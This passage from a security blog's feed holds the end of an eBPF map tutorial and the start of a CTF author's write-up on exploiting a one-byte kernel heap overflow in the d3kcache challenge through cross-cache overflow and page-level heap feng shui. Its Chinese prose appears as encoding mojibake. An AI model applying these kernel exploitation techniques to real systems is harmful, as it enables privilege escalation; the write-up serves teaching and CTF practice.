class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>        .map_fd = map_fd,<br>        .key = (<span class="hljs-type">uint64_t</span>) key,<br>    &#125;;<br><br>    <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">char</span> orig_value[<span class="hljs-number">0x100</span>] = <span class="hljs-string">&quot;1145141919810&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">char</span> value[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> map_fd;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Creating new eBPF map...&quot;</span>);<br>    map_fd = bpf_map_create(BPF_MAP_TYPE_HASH, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x100</span>, <span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">if</span> (map_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Adding new map of key-&gt;value...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_update_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, orig_value, BPF_ANY) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to update eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Looking up element in map...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (bpf_map_lookup_elem(map_fd, <span class="hljs-string">&quot;arttnba3&quot;</span>, value) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to look up elem in eBPF map!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Successfully get the elem of key %s: %s\n&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, value);<br><br>    close(map_fd);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2023/05/31/C3vdouj5VryPMws.png" alt="image.png"></p><p>è¿è¡Œåœ¨å†…æ ¸ä¸­çš„ eBPF ç¨‹åºä¹Ÿå¯ä»¥é€šè¿‡ eBPF map çš„ fd è®¿é—®ä¸€ä¸ª eBPF mapï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºğŸŒ°ç¨‹åºï¼š</p><blockquote><p>æ³¨ï¼šè¿™é‡Œç¬”è€…å°†å¸¸ç”¨å‡½æ•° &amp; æŒ‡ä»¤å°è£…åœ¨äº† <a href="/download/bpf_tools.h">bpf_tools.h</a> ä¸­</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><br></code></pre></td></tr></table></figure><h1 id="0xFF-REFERENCE"><a href="#0xFF-REFERENCE" class="headerlink" title="0xFF.REFERENCE"></a>0xFF.REFERENCE</h1><p><a href="https://arthurchiao.art/blog/linux-socket-filtering-aka-bpf-zh/">[è¯‘] Linux Socket Filtering (LSF, aka BPF)ï¼ˆKernelDocï¼Œ2021ï¼‰</a></p><p><a href="https://heapdump.cn/article/5420563">HeapDump - eBPFæŒ‡ä»¤é›†è§„èŒƒv1.0</a></p><p><a href="https://www.anquanke.com/post/id/263803">BPFä¹‹è·¯ä¸€bpfç³»ç»Ÿè°ƒç”¨</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;BEE BEE Iâ€™M A SHEEP&lt;/p&gt;</summary>
    
    
    
    <category term="EBPF" scheme="http://blog.arttnba3.cn/categories/EBPF/"/>
    
    
    <category term="eBPF" scheme="http://blog.arttnba3.cn/tags/eBPF/"/>
    
    <category term="Linux kernel" scheme="http://blog.arttnba3.cn/tags/Linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>ã€CTF.0x08ã€‘D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®°</title>
    <link href="http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/"/>
    <id>http://blog.arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/</id>
    <published>2023-05-01T19:13:27.000Z</published>
    <updated>2023-05-28T01:20:15.849Z</updated>
    
    <content type="html"><![CDATA[<p>ã€Œã•ã‚‰ã°ã€å…¨ã¦ã®ãƒªãƒŒã‚¯ã‚¹ ã‚«ãƒ¼ãƒãƒ« ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³ã€‚ã€</p><span id="more"></span><h1 id="0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰"><a href="#0x00-ä¸€åˆ‡å¼€å§‹ä¹‹å‰" class="headerlink" title="0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰"></a>0x00.ä¸€åˆ‡å¼€å§‹ä¹‹å‰</h1><blockquote><p>éƒ½æ˜¯åºŸè¯ï¼Œå¯ä»¥ä¸ç”¨çœ‹ï¼ˆç¬‘ï¼‰</p></blockquote><p>ä¸å‡ºæ„å¤–çš„è¯è¿™åº”è¯¥æ˜¯ç¬”è€…æœ¬ç§‘é˜¶æ®µæœ€åä¸€æ¬¡å‡º D3CTF çš„é¢˜ç›®äº†ï¼Œè™½ç„¶è¯´ç¬”è€…ä¸€ç›´æƒ³æ•´ä¸€äº›å¥½æ´»ï¼Œä½†æ˜¯é‰´äºç¬”è€…å®åœ¨æ˜¯å¤ªèœäº†æ‰€ä»¥ä¸€ç›´æ²¡èƒ½å‡ºè¿‡ç‰¹åˆ«ä¼˜ç§€çš„é¢˜ç›®ï¼šï¼‰</p><!--ç›¸ä¿¡æœ‰ä¸å°‘äººï¼ˆå½“ç„¶ï¼Œç¬”è€…çš„çƒ‚é¢˜åº”è¯¥ä¸ä¼šæœ‰å¤šå°‘äººæ„¿æ„åš:-D ï¼‰åº”å½“å·²ç»æ³¨æ„åˆ°é¢˜ç›®çš„ banner æ˜¯ neta è‡ªæ–°ä¸–çºªç¦éŸ³æˆ˜å£«å‰§åœºç‰ˆçš„æµ·æŠ¥----ç¬”è€…éœ€è¦ä¸ºè‡ªå·±è¿‡å»å¤±è´¥çš„è¿™ä¸€å¹´å¤šæ—¶é—´ç”»ä¸Šä¸€ä¸ªä¸å®Œç¾çš„å¥å·ï¼Œè€Œè¿™é“é¢˜ä¾¿æ˜¯ç¬”è€…å‘æ›¾ç»é‚£ä¸ªè¢«å›°äº Linux kernel çš„å°æœ‹å‹æ‰€ä½œçš„æœ€ç»ˆé“åˆ«ï¼šï¼‰--><p>ç¬”è€…ä¸€ç›´åœ¨æƒ³ï¼Œä½œä¸ºä¸€åé»‘å®¢ï¼Œåœ¨å‰¥ç¦»å»å„ç§ä¸åŒçš„é¢˜ç›®ç»“æ„ã€æ¼æ´ç¯å¢ƒçš„èƒŒåï¼Œ<strong>æˆ‘ä»¬ç©¶ç«Ÿèƒ½åœ¨å¤šä¹ˆæç«¯çš„æƒ…å†µä¸‹å®Œæˆå¯¹ä¸€ä¸ªæ¼æ´çš„åˆ©ç”¨ï¼Ÿæˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿè„±ç¦»å®éªŒå®¤çš„ç†æƒ³ç¯å¢ƒå®ç°ä¸€ç§è¶³ä»¥åº”ç”¨åœ¨å®æˆ˜ä¸­çš„é€šè§£ï¼Ÿ</strong></p><p>Google åœ¨ CVE-2021-22555 å½“ä¸­å‘æˆ‘ä»¬å±•ç¤ºäº†ä¸€ä¸ªæ™®é€šçš„å †ä¸Š 2 å­—èŠ‚æº¢å‡ºå¦‚ä½•å˜æˆå †æº¢å‡º&amp; UAF é€šæ€è§£æ³•ï¼Œ<a href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">BitsByWill</a> åœ¨ corCTF 2022 ä¸­å‘æˆ‘ä»¬å±•ç¤ºäº†åˆ©ç”¨é¡µçº§å†…æ ¸å †é£æ°´æ‰“ç ´ä¸åŒ caches é—´çš„é˜»éš”ï¼Œ<a href="https://syst3mfailure.io/">D3v17</a> åˆ™ä»…åˆ©ç”¨ä¸€ä¸ª <code>&#39;\0&#39;</code> å­—èŠ‚çš„å †æº¢å‡ºä¾¿å®Œæˆäº†å†…æ ¸ææƒï¼Œ<a href="https://kylebot.net/">Kylebot</a> æ›´æ˜¯å°†è¿™ä¸€ä¸ª <code>&#39;\0&#39;</code> å­—èŠ‚çš„å †æº¢å‡ºè½¬æˆäº† cross-cache overflow å®Œæˆåˆ©ç”¨ï¼Œé‚£ä¹ˆå†æ›´è¿›ä¸€æ­¥å‘¢â€”â€”</p><ul><li>å¦‚æœæ¼æ´æ‰€åœ¨ç»“æ„ä½“å¤§å°ä¸å¤Ÿåˆé€‚&#x2F;ç»“æ„ä½“è‡ªèº«æ— æ³•å¸®åŠ©æˆ‘ä»¬å®Œæˆåˆ©ç”¨ï¼Œæˆ‘ä»¬åªèƒ½å€ŸåŠ© <code>msg_msg</code> ç­‰ç»“æ„ä½“å»é€‚é…å¤§å°ï¼Œä½†è¿™ç±»ç»“æ„ä½“è¾ƒä¸ºç¨€æœ‰ä¸”å­˜åœ¨è¯¸å¤šé™åˆ¶ï¼ˆä¾‹å¦‚å¾€å¾€å¸¦æœ‰ä¸€ä¸ª headerï¼‰</li><li>å¦‚æœæ¼æ´å­˜åœ¨äºä¸€ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code> å½“ä¸­ï¼Œæˆ‘ä»¬æ— æ³•å€ŸåŠ©å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“å®Œæˆåˆ©ç”¨ï¼Œåªèƒ½è€ƒè™‘è½¬åŒ–ä¸º cross-cache overflow</li><li>å¦‚æœæ¼æ´ä»…æœ‰ 1 å­—èŠ‚çš„æº¢å‡ºï¼Œæˆ‘ä»¬æ— æ³•åˆ©ç”¨é¡µçº§å †é£æ°´è½¬æˆåˆ©ç”¨ Google çš„é€šæ€ exp ï¼Œåˆæˆ–æ˜¯ç¦ç”¨äº† System V æ¶ˆæ¯é˜Ÿåˆ—æ— æ³•åˆ©ç”¨å¤šçº§ <code>msg_msg</code>  æ„é€  UAFï¼Œæˆ‘ä»¬ä¾¿åªèƒ½è€ƒè™‘å…¶ä»–çš„æ–¹æ¡ˆ</li><li>å¦‚æœç³»ç»Ÿå†…å­˜è¾ƒå°ï¼Œ æˆ–æ˜¯ <code>modprobe_path</code> ä¸ºé™æ€å€¼ï¼ŒKylebot çš„ unlink attack å°†æ— æ³•å‘æŒ¥ä½œç”¨ï¼Œæˆ‘ä»¬åªå¥½è€ƒè™‘ D3v17 çš„ <code>poll_list</code> ä»»æ„é‡Šæ”¾</li><li>å¦‚æœæ¼æ´æ‰€åœ¨ç»“æ„ä½“å¤§å°ä¸å¤Ÿåˆé€‚ï¼Œæˆ‘ä»¬åªèƒ½è¿›è¡Œæ›´åŠ ç»†ç²’åº¦çš„é¡µçº§å †é£æ°´ï¼Œ<strong>è€Œä¸åŒ order é—´çš„é£æ°´ä¼šä½¿å¾—æˆåŠŸç‡å¤§æ‰“æŠ˜æ‰£</strong></li><li><strong>å¦‚æœå†…æ ¸å¼€å¯äº† Control Flow Integrityï¼Œåˆæˆ–è€…æˆ‘ä»¬ç”šè‡³éƒ½ä¸çŸ¥é“å†…æ ¸é•œåƒä¿¡æ¯ï¼Œé‚£ä¹ˆä¼ ç»Ÿçš„ ROP æ–¹æ³•åŸºæœ¬å®£å‘Šæ­»äº¡</strong></li></ul><p><strong>åœ¨è¿™æ ·æç«¯çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æ˜¯å¦è¿˜ä»èƒ½å¤Ÿæ‰¾åˆ°ä¸€ç§é€šæ³•æ¥å®Œæˆå¯¹å†…æ ¸æ¼æ´çš„åˆ©ç”¨ï¼Ÿ</strong>â€”â€”è¿™ä¾¿æ˜¯ç¬”è€…åœ¨å‡ºè¿™é“é¢˜æ—¶æœ€åˆçš„æƒ³æ³•ï¼šï¼‰</p><!--æ­¤å¤–ï¼Œç¬”è€…è®¤ä¸ºï¼Œ**è‹¥æˆ‘ä»¬çœŸçš„æ‰¾åˆ°äº†è¿™æ ·çš„ä¸€ç§é€šæ³•ï¼Œé‚£ä¹ˆæ­¤åçš„åŸºäºå†…å­˜ç ´åçš„ Linux kernel exploitation ä¾¿çœŸæ­£ç®—æ˜¯å®£å‘Šèµ°åˆ°äº†å°½å¤´ï¼Œæ­¤åæ‰€æœ‰çš„æ­¤ç±»æ¼æ´æˆ–æ˜¯é¢˜ç›®ä¸è¿‡éƒ½æ˜¯æ¢ä¸€ç§å½¢å¼è¿‡å®¶å®¶ç½¢äº†ï¼šï¼‰**----è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆç¬”è€…è¦ç”¨ ã€Ševaï¼šç»ˆã€‹ çš„é‚£å¥è¯æ¥ä½œä¸ºè¿™é“é¢˜ç›®çš„æ ‡è¯­ã€‚--><h1 id="0x01-é¢˜ç›®åˆ†æ"><a href="#0x01-é¢˜ç›®åˆ†æ" class="headerlink" title="0x01.é¢˜ç›®åˆ†æ"></a>0x01.é¢˜ç›®åˆ†æ</h1><p>é¢˜ç›®é€†å‘èµ·æ¥åº”è¯¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œåœ¨æ¨¡å—åˆå§‹åŒ–å‡½æ•°ä¸­åˆ›å»ºäº†ä¸€ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code> ï¼Œå¯¹è±¡å¤§å°ä¸º 2048ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> KCACHE_SIZE 2048</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">d3kcache_module_init</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    kcache_jar = kmem_cache_create_usercopy(<span class="hljs-string">&quot;kcache_jar&quot;</span>, KCACHE_SIZE, <span class="hljs-number">0</span>, <br>                         SLAB_HWCACHE_ALIGN | SLAB_PANIC | SLAB_ACCOUNT, <br>                         <span class="hljs-number">0</span>, KCACHE_SIZE, <span class="hljs-literal">NULL</span>);<br><br>    <span class="hljs-built_in">memset</span>(kcache_list, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(kcache_list));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è‡ªå®šä¹‰çš„ ioctl å‡½æ•°æä¾›äº†åˆ†é…ã€è¿½åŠ ç¼–è¾‘ã€é‡Šæ”¾ã€è¯»å–çš„ä¸€ä¸ªå †èœå•ï¼Œæ¼æ´ä¾¿å‡ºåœ¨è¿½åŠ ç¼–è¾‘å½“ä¸­ï¼Œå½“å†™æ»¡ 2048 å­—èŠ‚æ—¶å­˜åœ¨ç€ä¸€ä¸ª <code>\0</code> å­—èŠ‚çš„æº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">d3kcache_ioctl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *__file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> param)</span><br>&#123;<br>    <span class="hljs-comment">//...</span><br><br>    <span class="hljs-keyword">switch</span> (cmd) &#123;<br>        <span class="hljs-comment">//...</span><br>        <span class="hljs-keyword">case</span> KCACHE_APPEND:<br>            <span class="hljs-keyword">if</span> (usr_cmd.idx &lt; <span class="hljs-number">0</span> || usr_cmd.idx &gt;= KCACHE_NUM <br>                || !kcache_list[usr_cmd.idx].buf) &#123;<br>                printk(KERN_ALERT <span class="hljs-string">&quot;[d3kcache:] Invalid index to write.&quot;</span>);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (usr_cmd.sz &gt; KCACHE_SIZE || <br>                (usr_cmd.sz + kcache_list[usr_cmd.idx].size) &gt;= KCACHE_SIZE) &#123;<br>                size = KCACHE_SIZE - kcache_list[usr_cmd.idx].size;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                size = usr_cmd.sz;<br>            &#125;<br><br>            kcache_buf = kcache_list[usr_cmd.idx].buf;<br>            kcache_buf += kcache_list[usr_cmd.idx].size;<br><br>            <span class="hljs-keyword">if</span> (copy_from_user(kcache_buf, usr_cmd.buf, size)) &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br><br>            kcache_buf[size] = <span class="hljs-string">&#x27;\0&#x27;</span>; <span class="hljs-comment">/* æ¼æ´ç‚¹ */</span><br><br>            retval = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>            <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p>åŒæ—¶æŸ¥çœ‹é¢˜ç›®æ‰€æä¾›çš„å†…æ ¸ç¼–è¯‘æ–‡ä»¶ï¼Œå¯ä»¥å‘ç°<strong>å¼€å¯äº† Control Flow Integrity ä¿æŠ¤</strong>ï¼š</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">CONFIG_CFI_CLANG</span>=y<br></code></pre></td></tr></table></figure><p>å…¶ä»–çš„å„ç§å¸¸è§„ä¿æŠ¤ï¼ˆKPTIã€KASLRã€Hardened Usercopyã€â€¦ï¼‰åŸºæœ¬ä¸Šéƒ½æ˜¯å¼€å¯çš„ï¼Œè¿™é‡Œå°±ä¸é˜è¿°äº†</p><blockquote><p>å½“ç„¶ï¼Œåšå†…æ ¸æ¼æ´åˆ©ç”¨è‡ªç„¶è¦é»˜è®¤è¿™äº›ä¿æŠ¤éƒ½å¼€äº†ï¼šï¼‰</p></blockquote><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>ç”±äºé¢˜ç›®æ‰€åœ¨çš„ <code>kmem_cache</code> ä¸ºä¸€ä¸ªç‹¬ç«‹çš„  <code>kmem_cache</code> ï¼Œå› æ­¤æˆ‘ä»¬åªèƒ½è€ƒè™‘ <strong>cross-cache overflow</strong>ï¼š<strong>æº¢å‡ºåˆ°å…¶ä»–ç»“æ„ä½“æ‰€åœ¨é¡µé¢ä¸Šå®Œæˆåˆ©ç”¨</strong></p><blockquote><p>æ¯•ç«Ÿä½ æ€»ä¸èƒ½æŒ‡æœ›åœ¨ freelist ç›¸å…³ä¿æŠ¤éƒ½å¼€å¯çš„æƒ…å†µä¸‹ free object çš„ next æŒ‡é’ˆåˆšå¥½åœ¨å‰ 8 å­—èŠ‚ç„¶åè¦†å†™åˆåˆšå¥½èƒ½æŠŠ freelist åŠ«æŒåˆ°æœ‰æ•ˆå¯æ§åœ°å€ä¸Šï¼šï¼‰</p></blockquote><h2 id="Step-I-é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€"><a href="#Step-I-é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€" class="headerlink" title="Step.I - é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€"></a>Step.I - é¡µçº§å †é£æ°´æ„é€ ç¨³å®šè·¨é¡µæº¢å‡ºå¸ƒå±€</h2><p>ä¸ºäº†ä¿è¯æº¢å‡ºçš„ç¨³å®šæ€§ï¼Œè¿™é‡Œç¬”è€…ä½¿ç”¨é¡µçº§å †é£æ°´çš„æ–¹æ³•æ¥æ„é€ <strong>é¢„æº¢å‡ºå¸ƒå±€</strong></p><h3 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h3><p>é¡µçº§å †é£æ°´æ˜¯ä¸€ç§å…¶å®ä¸ç®—æ–°ä½†æ˜¯å…¶å®è¿˜æ˜¯ç¨å¾®æœ‰ç‚¹æ–°çš„åˆ©ç”¨æ‰‹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œ<strong>é¡µçº§å †é£æ°´</strong>å³ä»¥å†…å­˜é¡µä¸ºç²’åº¦çš„å†…å­˜æ’å¸ƒæ–¹å¼ï¼Œè€Œå†…æ ¸å†…å­˜é¡µçš„æ’å¸ƒå¯¹æˆ‘ä»¬æ¥è¯´ä¸ä»…æœªçŸ¥ä¸”ä¿¡æ¯é‡å·¨å¤§ï¼Œå› æ­¤è¿™ç§åˆ©ç”¨æ‰‹æ³•å®é™…ä¸Šæ˜¯è®©æˆ‘ä»¬<strong>æ‰‹å·¥æ„é€ ä¸€ä¸ªæ–°çš„å·²çŸ¥çš„é¡µçº§ç²’åº¦å†…å­˜é¡µæ’å¸ƒ</strong></p><p>é¦–å…ˆè®©æˆ‘ä»¬é‡æ–°å®¡è§† slub allocator å‘ buddy system è¯·æ±‚é¡µé¢çš„è¿‡ç¨‹ï¼Œå½“ freelist page å·²ç»è€—ç©ºä¸” partial é“¾è¡¨ä¹Ÿä¸ºç©ºæ—¶ï¼ˆæˆ–è€… <code>kmem_cache</code> åˆšåˆšåˆ›å»ºåè¿›è¡Œç¬¬ä¸€æ¬¡åˆ†é…æ—¶ï¼‰ï¼Œå…¶ä¼šå‘ buddy system ç”³è¯·é¡µé¢ï¼š</p><p><img src="https://s2.loli.net/2023/01/19/yPtXiwzVfxWH7lE.png" alt="image.png"></p><p>æ¥ä¸‹æ¥è®©æˆ‘ä»¬é‡æ–°å®¡è§† buddy system ï¼Œå…¶åŸºæœ¬åŸç†å°±æ˜¯ä»¥ 2 çš„ order æ¬¡å¹‚å¼ å†…å­˜é¡µä½œä¸ºåˆ†é…ç²’åº¦ï¼Œç›¸åŒ order é—´ç©ºé—²é¡µé¢æ„æˆåŒå‘é“¾è¡¨ï¼Œå½“ä½é˜¶ order çš„é¡µé¢ä¸å¤Ÿç”¨æ—¶ä¾¿ä¼šä»é«˜é˜¶ order å–ä¸€ä»½è¿ç»­å†…å­˜é¡µæ‹†æˆä¸¤åŠï¼Œå…¶ä¸­ä¸€åŠæŒ‚å›å½“å‰è¯·æ±‚ order é“¾è¡¨ï¼Œå¦ä¸€åŠè¿”è¿˜ç»™ä¸Šå±‚è°ƒç”¨è€…ï¼›ä¸‹å›¾ä¸ºä»¥ order 2 ä¸ºä¾‹çš„ buddy system é¡µé¢åˆ†é…åŸºæœ¬åŸç†ï¼š</p><p><img src="https://s2.loli.net/2023/01/19/79biltjNfACIZcP.gif" alt="page.gif"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼šä»æ›´é«˜é˜¶ order æ‹†åˆ†æˆçš„ä¸¤ä»½ä½é˜¶ order çš„è¿ç»­å†…å­˜é¡µ<strong>æ˜¯ç‰©ç†è¿ç»­çš„</strong>ï¼Œç”±æ­¤æˆ‘ä»¬å¯ä»¥ï¼š</p><ul><li>å‘ buddy system è¯·æ±‚ä¸¤ä»½è¿ç»­çš„å†…å­˜é¡µ</li><li>é‡Šæ”¾å…¶ä¸­ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>vulnerable kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li><li>é‡Šæ”¾å¦ä¸€ä»½å†…å­˜é¡µï¼Œåœ¨ <code>victim kmem_cache</code> ä¸Šå †å–·ï¼Œè®©å…¶å–èµ°è¿™ä»½å†…å­˜é¡µ</li></ul><p><strong>æ­¤æ—¶æˆ‘ä»¬ä¾¿æœ‰å¯èƒ½æº¢å‡ºåˆ°å…¶ä»–çš„å†…æ ¸ç»“æ„ä½“ä¸Šï¼Œä»è€Œå®Œæˆ cross-cache overflow</strong></p><h3 id="å…·ä½“åˆ©ç”¨"><a href="#å…·ä½“åˆ©ç”¨" class="headerlink" title="å…·ä½“åˆ©ç”¨"></a>å…·ä½“åˆ©ç”¨</h3><p>åœ¨å†…æ ¸å½“ä¸­æœ‰ç€å¾ˆå¤šçš„å¯ä»¥ç›´æ¥å‘ buddy system è¯·æ±‚é¡µé¢çš„ APIï¼Œè¿™é‡Œç¬”è€…é€‰ç”¨ä¸€ä¸ªæ¥è‡ªäº <a href="https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html">CVE-2017-7308</a> çš„æ–¹æ¡ˆï¼š</p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ª protocol ä¸º <code>PF_PACKET</code> çš„ socket ä¹‹åï¼Œå…ˆè°ƒç”¨ <code>setsockopt()</code> å°† <code>PACKET_VERSION</code> è®¾ä¸º  <code>TPACKET_V1 </code>&#x2F; <code>TPACKET_V2</code>ï¼Œå†è°ƒç”¨ <code>setsockopt()</code> æäº¤ä¸€ä¸ª <code>PACKET_TX_RING</code> ï¼Œæ­¤æ—¶ä¾¿å­˜åœ¨å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">__sys_setsockopt()<br>    sock-&gt;ops-&gt;setsockopt()<br>    packet_setsockopt() <span class="hljs-comment">// case PACKET_TX_RING â†“</span><br>    packet_set_ring()<br>    alloc_pg_vec()<br></code></pre></td></tr></table></figure><p>åœ¨ <code>alloc_pg_vec()</code> ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>pgv</code> ç»“æ„ä½“ï¼Œç”¨ä»¥åˆ†é… <code>tp_block_nr</code> ä»½ 2<sup>order</sup> å¼ å†…å­˜é¡µï¼Œå…¶ä¸­ <code>order</code> ç”± <code>tp_block_size</code> å†³å®šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> pgv *<span class="hljs-title function_">alloc_pg_vec</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)</span><br>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> block_nr = req-&gt;tp_block_nr;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pgv</span> *<span class="hljs-title">pg_vec</span>;</span><br><span class="hljs-type">int</span> i;<br><br>pg_vec = kcalloc(block_nr, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>pg_vec[i].buffer = alloc_one_pg_vec_page(order);<br><span class="hljs-keyword">if</span> (unlikely(!pg_vec[i].buffer))<br><span class="hljs-keyword">goto</span> 